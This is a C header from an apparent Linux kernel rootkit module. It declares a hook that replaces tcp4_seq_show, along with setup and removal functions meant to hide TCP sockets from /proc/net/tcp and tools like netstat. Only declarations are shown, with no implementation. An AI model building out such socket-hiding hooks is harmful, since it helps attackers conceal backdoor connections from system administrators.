#ifndef SOCKET_HIDING_H
#define SOCKET_HIDING_H

#include <linux/types.h>
#include <linux/seq_file.h>

asmlinkage int hooked_tcp4_seq_show(struct seq_file *seq, void *v);
extern asmlinkage int (*real_tcp4_seq_show)(struct seq_file *seq, void *v);

void setup_socket_hiding(void);
void remove_socket_hiding(void);

#endif
